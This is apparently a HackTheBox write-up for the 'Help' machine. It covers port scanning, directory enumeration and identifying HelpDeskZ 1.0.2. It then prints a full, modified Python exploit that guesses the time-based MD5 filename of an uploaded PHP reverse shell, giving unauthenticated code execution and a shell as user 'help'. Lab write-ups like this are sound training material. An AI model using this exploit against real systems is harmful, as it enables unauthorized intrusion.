![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/addb842d-c4bf-4aed-b681-0ffc74ab64f0)

https://app.hackthebox.com/machines/Help

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began with the quick rustscan & observed 3 open port from the scan, i.e. 22, 80, 3000.

```bash
sudo rustscan -a 10.10.10.121 -- -sC -sV -vv -oN help_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/63f363fd-7d91-4d9d-bbc9-8fed5c1e10a1)

```Rust
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the scan results I observed that:

- On port 22 SSH is running, which is default.
- On port 80 HTTP server is running with the domain: "help.htb", which I added to my host config file.
- Port 3000 also hosted a HTTP server with "Node.js Express framework".

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

After fininshing the port scan I browsed through the domain "http://help.htb" & found it's just an default Apache server page.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f0c31e9e-9df0-4219-91de-36cb918a90d9)

Moved onto the port 3000 & observed just a note: "Hi Shiv, To get access please find the credentials with given query"

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/828494b0-b3e3-4fa2-946c-791597e9d63f)

Once browsing through the web pages I perform sub-directory enumeration on "help.htb" & found 2 new directories:

```bash
gobuster dir -u http://help.htb/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o help_web -x txt,php,congif,aspx -e -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/76b815b2-595b-43f1-98b7-84d8b91f44d7)

The javascript end point is blocked for me but I was able to browse through "help.htb/support" & found a "HelpDeskZ" application running.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/92905cb7-05ae-488c-8668-d466e9c9e402)

I checked for "HelpDeskZ" related exploit in searchsploit & got 2 results in which one of the exploit is related to "Arbitrary file upload for version 1.0.2":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cf470d0e-7213-41f9-83f0-8c933df4d9be)

But I didn't able to determine yet that which version of HelpDeskZ is currently running, so I searched for HelpDeskZ GitHub repo & simultaneously I started sub-directory enumeration as well.
While searching on Github I found this [repo](https://github.com/alitalaghat/HelpDeskZ-1.0), which contains multiple directories:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e3023354-426a-45f3-88f2-a7ade9d45558)

Gobuster scan showed me the scans which is matching with the Github directories as well:

```bash
gobuster dir -u http://help.htb/support/ -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -e -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e5eca4d-a4c3-407e-91b3-0074be4a6d80)

This makes me confirm that the HelpDeskZ service is running on version 1.0.2 as the other versions isn't having the similar directories. 

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

After confirming the version running on the target box I downloaded the python exploit from the searchsploit & as per the exploit memtioned:

```
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.
```
By following the exploit I submitted a ticket on the forum with a PHP reverse shell file & executed the python script. But even after attempting multiple time I wasn't able to execute my shell:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/452628ea-1dd8-4e57-9c13-01b44f854eb7)

### Exploit code review & changes:

Moving further I checked the source code of the application & checked for the upload file location. I found that the application is uploading the files towards '/ticket' directory.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e65d1588-1fbc-43c2-9740-f357f62f86a7)

So, I made some changes in the code, removed the user input argument part, added the file location & file name manually. Here is the final code after my edit:

```python
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

''' #commented this part to stop taking user argument
if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)
'''

helpdeskzBaseUrl = 'http://help.htb/support/uploads/tickets/'
fileName = 'better_rev.php' #This is the pentest-monkey PHP reverse shell script, listening on 1337


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
```

After making the neccessary changes I executed the code again & started my netcat listener & finally received the shell as "help". Also, got the user flag in the home directory of the "help" user as well. (Pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/867ba655-85fb-4d5f-a3ac-6d6a6007ed59)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/db85ec0b-1446-4923-8ed5-42f780f9ef78)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cf4d8efe-2e68-4fe8-bd97-568d7e3e5c24)

